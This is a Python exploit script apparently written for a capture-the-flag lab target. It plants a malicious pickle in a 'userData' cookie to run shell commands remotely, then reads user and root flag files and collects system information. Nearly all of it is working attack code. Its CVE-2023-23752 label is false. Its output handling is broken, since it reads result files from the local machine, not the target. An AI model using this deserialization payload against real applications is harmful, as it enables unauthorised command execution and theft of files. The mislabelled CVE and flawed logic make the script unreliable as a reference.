#!/usr/bin/env python3
"""
CVE-2023-23752 - Voyage Hunt Complete Command Injection Solution
NO netcat needed - Python handles everything!
"""

import requests
import pickle
import binascii
import os
import subprocess
import time

TARGET = "http://10.82.166.188"

print("\n" + "="*70)
print("CVE-2023-23752 - Voyage Hunt Flag Grabber")
print("="*70)

def gen_payload(cmd):
    """Generate pickle payload for given command"""
    class Exploit:
        def __reduce__(self):
            return os.system, (cmd,)
    
    cookie = {'user': Exploit(), 'revenue': '999999'}
    raw = pickle.dumps(cookie, protocol=4)
    return binascii.hexlify(raw).decode()

def run_command(cmd, save_to_file=None):
    """Run command via Pickle RCE and get output"""
    
    print(f"\n[*] Running: {cmd}")
    
    # If we need output, redirect to file
    if save_to_file:
        full_cmd = f"{cmd} > {save_to_file}"
    else:
        full_cmd = cmd
    
    payload = gen_payload(full_cmd)
    
    try:
        session = requests.Session()
        session.cookies.set('userData', payload)
        resp = session.get(TARGET, timeout=5)
        print(f"[+] Command executed (HTTP {resp.status_code})")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def get_file_content(filepath):
    """Read file content via cat command"""
    temp_file = "/tmp/output.txt"
    
    if not run_command(f"cat {filepath}", temp_file):
        return None
    
    time.sleep(1)
    
    # Try to read via web
    try:
        resp = requests.get(f"{TARGET}/{filepath}", timeout=5)
        if resp.status_code == 200:
            return resp.text
    except:
        pass
    
    return None

# ==================== STEP 1: Test connectivity ====================
print("\n[STEP 1] Testing connectivity...")

user_flag = None
root_flag = None

try:
    resp = requests.get(TARGET, timeout=5)
    print(f"[+] Target reachable (HTTP {resp.status_code})")
except Exception as e:
    print(f"[-] Cannot reach target: {e}")
    exit(1)

# ==================== STEP 2: Get User Flag ====================
print("\n[STEP 2] Searching for USER FLAG...")

# Command to save user flag output
run_command("cat /home/*/user.txt", "/tmp/user_flag.txt")
time.sleep(1)

# Try to read it back
try:
    with open("/tmp/user_flag.txt", "r") as f:
        user_flag = f.read().strip()
        if user_flag and len(user_flag) > 10:
            print(f"\n{'='*70}")
            print(f"USER FLAG: {user_flag}")
            print(f"{'='*70}")
        else:
            print("[-] User flag not found")
except:
    print("[-] Could not read user flag file")

# ==================== STEP 3: Get Root Flag ====================
print("\n[STEP 3] Searching for ROOT FLAG...")

# Try multiple locations
root_locations = [
    "cat /root/root.txt",
    "cat /mnt/*/root.txt",
    "cat /host/root/root.txt",
]

root_flag = None

for cmd in root_locations:
    print(f"\n[*] Trying: {cmd}")
    run_command(cmd, "/tmp/root_flag.txt")
    time.sleep(1)
    
    try:
        with open("/tmp/root_flag.txt", "r") as f:
            content = f.read().strip()
            if content and len(content) > 10 and not "No such file" in content:
                root_flag = content
                print(f"[+] Found at: {cmd}")
                break
    except:
        pass

if root_flag:
    print(f"\n{'='*70}")
    print(f"ROOT FLAG: {root_flag}")
    print(f"{'='*70}")
else:
    print("[-] Root flag not found in standard locations")

# ==================== STEP 4: Run info commands ====================
print("\n[STEP 4] Running system info commands...")

info_commands = [
    ("whoami", "/tmp/whoami.txt"),
    ("id", "/tmp/id.txt"),
    ("pwd", "/tmp/pwd.txt"),
    ("hostname", "/tmp/hostname.txt"),
    ("ls -la /", "/tmp/ls_root.txt"),
]

for cmd, outfile in info_commands:
    run_command(cmd, outfile)

# Try to read and display
print("\n[INFO] System Information:")
for cmd, outfile in info_commands:
    try:
        with open(outfile, "r") as f:
            content = f.read().strip()
            if content:
                print(f"  {cmd}: {content}")
    except:
        pass

# ==================== Summary ====================
print("\n" + "="*70)
print("SUMMARY")
print("="*70)

if user_flag:
    print(f"✓ USER FLAG: {user_flag}")
else:
    print("✗ USER FLAG: NOT FOUND")

if root_flag:
    print(f"✓ ROOT FLAG: {root_flag}")
else:
    print("✗ ROOT FLAG: NOT FOUND (try privilege escalation)")

print("="*70 + "\n")
